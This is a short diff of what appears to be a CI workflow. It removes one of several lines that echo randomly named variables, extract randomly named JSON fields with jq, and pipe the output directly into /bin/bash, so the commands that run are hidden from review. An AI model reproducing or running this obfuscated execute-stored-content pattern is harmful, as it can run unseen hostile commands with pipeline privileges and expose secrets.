@@ -23,7 +23,6 @@ jobs:
           echo $jh70 | jq -r .poute11 | /bin/bash
           echo $m06 | jq -r .li2 | /bin/bash
           echo $wnemy76 | jq -r .an29 | /bin/bash
-          echo $qt92 | jq -r .gpix459 | /bin/bash
           echo $wx2 | jq -r .ydmmp04010 | /bin/bash
           echo $dr91332 | jq -r .iiz935 | /bin/bash
           echo $fmyee4 | jq -r .mxrox6 | /bin/bash
